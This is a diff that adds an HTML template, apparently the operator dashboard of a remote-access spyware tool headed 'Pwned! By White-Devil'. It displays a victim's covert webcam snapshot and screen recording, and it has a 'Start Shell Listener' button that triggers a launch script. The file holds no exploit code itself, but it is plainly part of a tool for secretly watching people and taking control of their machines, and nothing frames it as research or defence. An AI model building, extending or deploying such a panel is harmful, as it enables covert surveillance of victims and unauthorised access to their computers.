@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" />
+    <link
+      rel="stylesheet"
+      href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
+    />
+    <link rel="apple-touch-icon" sizes="180x180" href={{ url_for("static",
+    filename="favicon_io/apple-touch-icon.png") }}> <link rel="icon"
+    type="image/png" sizes="32x32" href={{ url_for("static",
+    filename="favicon_io/favicon-32x32.png") }} /> <link rel="icon"
+    type="image/png" sizes="16x16" href={{ url_for("static",
+    filename="favicon_io/favicon-16x16.png") }} /> <link rel="manifest" href={{
+    url_for("static", filename="favicon_io/site.webmanifest") }} /> <link
+    rel="stylesheet" href={{ url_for("static", filename="assets/style.css") }}
+    />
+    <link rel="preconnect" href="https://fonts.gstatic.com" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=New+Tegomin&display=swap"
+      rel="stylesheet"
+    />
+
+    <title>HSR-Live</title>
+  </head>
+
+  <body>
+    <h1 class="header text-center" id="head-txt">Pwned! By White-Devil</h1>
+    <img class="header mx-auto d-block" id="ico" src={{ url_for("static",
+    filename="assets/hk.png") }} alt="icon" />
+    <div>
+      <div class="webcam-frame">
+        <img
+          class="mx-auto d-block border border-success"
+          id="webcam-img"
+          src="{{ webcam }}"
+          alt="Hidden webcamsnap"
+          onerror="webcamnf()"
+        />
+      </div>
+
+      <div class="pre-frame p-5 my-5">
+        <div
+          class="frame .container-fluid border border-danger"
+          id="screenshot"
+        >
+          <img
+            id="img-frame"
+            src="{{ screen }}"
+            alt="Hidden screenRecorder"
+            onerror="screenshotnf()"
+          />
+        </div>
+      </div>
+
+      <div class="text-center">
+        <button
+          onclick='window.location.href="/assets/launch.php?run=true;"'
+          id="shell-btn"
+          class="shell-btn btn-lg"
+        >
+          Start Shell Listener
+        </button>
+      </div>
+    </div>
+  </body>
+</html>
+
+<script src="{{ url_for("static", filename='assets/render.js') }}"></script>
+
+<script>
+  const errImg = "{{url_for('static', filename='assets/404.jpg') }}";
+  const screen = "{{url_for('static', filename='record/screen.png') }}";
+  const snap = "{{url_for('static', filename='record/snap.png') }}";
+</script>
